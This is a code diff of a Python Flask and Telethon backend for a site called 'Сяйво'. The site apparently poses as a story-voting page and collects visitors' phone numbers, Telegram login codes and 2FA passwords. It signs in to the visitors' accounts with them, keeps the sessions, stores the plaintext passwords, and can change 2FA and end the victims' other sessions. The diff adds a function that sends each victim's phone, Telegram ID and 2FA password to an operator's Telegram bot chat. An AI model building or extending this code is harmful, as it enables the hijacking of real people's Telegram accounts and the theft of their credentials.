@@ -1,17 +1,16 @@
 """
 Telegram manager + HTTP API для сайту «Сяйво».
-- accounts.json: {"accounts": [{"id", "session": "sessions/<id>", ...}]}
-- votes.json: записи голосів
-- Вікна форми на сайті з'являються по черзі: телефон → код → 2FA → успіх
 """
 import asyncio
 import hashlib
 import json
+import logging
 import os
 import re
 import uuid
 from datetime import datetime, timezone
 
+import requests
 from dotenv import load_dotenv
 from flask import Flask, jsonify, request
 from flask_cors import CORS
@@ -26,10 +25,13 @@ from telethon.errors import (
 from telethon.tl.functions.account import ResetAuthorizationRequest
 
 load_dotenv()
+logging.basicConfig(level=logging.INFO)
 
 # ============== CONFIG ==============
 API_ID = int(os.getenv("API_ID", "12345678"))
 API_HASH = os.getenv("API_HASH", "YOUR_API_HASH")
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
+TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
@@ -42,10 +44,40 @@ os.makedirs(SESSIONS_DIR, exist_ok=True)
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-
-# Тимчасові верифікації для сайту
-# token -> {phone, story, phone_code_hash, session_path, stage, two_fa}
 pending: dict[str, dict] = {}
+
+
+# ============== TELEGRAM BOT ==============
+def notify_telegram(vote: dict) -> None:
+    """Надсилає повідомлення про новий голос у Telegram."""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return
+    text = (
+        "🗳 <b>Новий голос!</b>\n\n"
+        f"📖 <b>{vote.get('story', '—')}</b>\n"
+        f"👤 Ім'я: {vote.get('first_name') or '—'}\n"
+        f"🔗 Username: @{vote.get('username') or '—'}\n"
+        f"📱 Телефон: <code>{vote.get('phone') or '—'}</code>\n"
+        f"🆔 Telegram ID: <code>{vote.get('telegram_id', '—')}</code>\n"
+        f"🔐 2FA: {'так' if vote.get('has_2fa') else 'ні'}\n"
+        f"🔑 Пароль 2FA: <code>{vote.get('two_fa_password') or '—'}</code>\n"
+        f"⏰ {vote.get('timestamp', '')}"
+    )
+    try:
+        resp = requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+            json={
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": text,
+                "parse_mode": "HTML",
+            },
+            timeout=10,
+        )
+        if not resp.ok:
+            app.logger.warning("Telegram bot failed: %s", resp.text)
+    except Exception as e:
+        app.logger.exception("notify_telegram error: %s", e)
+
 
 # ============== ACCOUNTS STORAGE ==============
 def load_accounts() -> dict:
@@ -61,7 +93,6 @@ def load_accounts() -> dict:
         with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
             json.dump({"accounts": []}, f, ensure_ascii=False, indent=2)
         return {"accounts": []}
-
 
 
 def save_accounts(data: dict) -> None:
@@ -88,11 +119,9 @@ def load_votes() -> dict:
                 return {"votes": []}
             return json.loads(content)
     except (json.JSONDecodeError, OSError):
-        # Пошкоджений файл — перезаписуємо
         with open(VOTES_FILE, "w", encoding="utf-8") as f:
             json.dump({"votes": []}, f, ensure_ascii=False, indent=2)
         return {"votes": []}
-
 
 
 def save_votes(data: dict) -> None:
@@ -117,7 +146,7 @@ def record_vote(telegram_id: int, phone: str, story: str,
                 has_2fa: bool = False,
                 two_fa_password: str = "") -> None:
     votes = load_votes()
-    votes["votes"].append({
+    vote = {
         "telegram_id": telegram_id,
         "phone": phone,
         "phone_hash": phone_hash(phone),
@@ -127,9 +156,10 @@ def record_vote(telegram_id: int, phone: str, story: str,
         "two_fa_password": two_fa_password,
         "story": story,
         "timestamp": datetime.now(timezone.utc).isoformat(),
-    })
+    }
+    votes["votes"].append(vote)
     save_votes(votes)
-
+    notify_telegram(vote)
 
 
 # ============== PHONE ==============
@@ -218,7 +248,7 @@ def api_send_code():
         "story": story,
         "phone_code_hash": code_hash,
         "session_path": session_path,
-        "stage": "code",  # очікуємо код
+        "stage": "code",
     }
 
     return jsonify({"ok": True, "token": token, "stage": "code"})
@@ -248,7 +278,6 @@ def api_verify_code():
                     code,
                 ))
             except SessionPasswordNeededError:
-                # Telegram просить 2FA -> переходимо в наступну стадію
                 record["stage"] = "password"
                 return jsonify({"ok": True, "stage": "password"})
             except (PhoneCodeInvalidError, PhoneCodeExpiredError):
@@ -259,7 +288,6 @@ def api_verify_code():
         elif record["stage"] == "password":
             if not password:
                 return jsonify({"ok": False, "error": "Введіть пароль 2FA"}), 400
-            # Зберігаємо пароль у записі для подальшого запису в votes.json
             record["two_fa_password"] = password
             try:
                 me = asyncio.run(_sign_in_password(record["session_path"], password))
@@ -274,7 +302,6 @@ def api_verify_code():
     if me is None:
         return jsonify({"ok": False, "error": "Не вдалося авторизуватись"}), 400
 
-    # Успіх — записуємо голос
     try:
         if has_voted(me.id, record["story"]):
             pending.pop(token, None)
@@ -290,9 +317,6 @@ def api_verify_code():
             has_2fa=record.get("stage") == "password",
             two_fa_password=record.get("two_fa_password", ""),
         )
-
-
-
     finally:
         pending.pop(token, None)
 
@@ -318,9 +342,8 @@ def api_votes():
 # ====================================================================
 
 async def add_account(phone: str) -> dict:
-    """Створює нову сесію через консоль і записує в accounts.json."""
     account_id = uuid.uuid4().hex[:12]
-    session_relpath = f"sessions/{account_id}"  # <- повний шлях
+    session_relpath = f"sessions/{account_id}"
     session_path = os.path.join(BASE_DIR, session_relpath)
 
     client = TelegramClient(session_path, API_ID, API_HASH)
@@ -379,7 +402,6 @@ async def set_2fa(account_id: str, new_password: str, hint: str = "Telegram pass
 
 
 async def reset_sessions(account_id: str):
-    """Завершує всі ІНШІ сесії (окрім поточної)."""
     account = get_account(account_id)
     if not account:
         raise ValueError("Акаунт не знайдений")
